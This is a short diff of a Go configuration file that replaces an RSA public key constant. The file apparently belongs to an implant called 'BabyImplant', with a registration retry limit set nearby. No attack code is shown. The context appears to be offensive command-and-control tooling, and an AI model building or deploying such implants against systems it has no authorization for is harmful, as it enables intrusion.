@@ -3,7 +3,7 @@ package config
 const (
 	ImplantName           string = "BabyImplant"
 	MaxRegisterRetryCount int    = 50
-	PublicKey             string = "MIIBCgKCAQEApBu0qZ45NuQ5WQ1TAtnKR45Joj3JvaT+umIOysCiUXB+IOs7cUjY1Pqmnt61x78+gBV+jBI5eQIPO9ZaAtxLlBjFAZza8YvMgUr4csqMC1yn/hBi7O80qhROE+7XCwCsn8snfCvjX72wQ7YbcEuPs4vLU+loVPyjyTBvnvgpveciozDK0xpVLt9fdMgmJn5VgvIG+5VleVve2PSrZinOGng8FvjsGV0gvQ6NbUyylyF4Ncov/nNYr9d39UJpSK6pTIA/GysE4V8IMO2tlccbo7ovNqulPCr2BYFxktaUolkw1wZ5TeNvxZ/NodHIxzTArVEt8cJqR98XjwdAYuYYpwIDAQAB"
+	PublicKey             string = "MIIBCgKCAQEA6DytLw66kgK+M4AljiutUpYygmKCo7nLevDRA0Oa4myxcQHIJRM09ARigqx4nlK9Tah4Czf4UvWTXzkpwYmLX8LPuQEks059hqRQuegieJ6UqPBFymuwPhy8P4Ml59tUlSAcXcgppWu0eeaHrnR06PAx0Ae2omad0/95qVZpWIfasBVOVWLz+2T+S7PErlaspXAd7QVO/eEfeDU4WSGbt/VhiiMTg2oKT6NSCC3GcfLCPGgPr9jf1/KIBeER39j1KyAe2Rji4+oMltSmPujn70tiiR2YdtfvxJI6bCMKHhauqK6d4Ps4rK2JQ9Ht+7KF2c7Cb5MCHymGz8e8+eQGhwIDAQAB"
 )
 
 var (
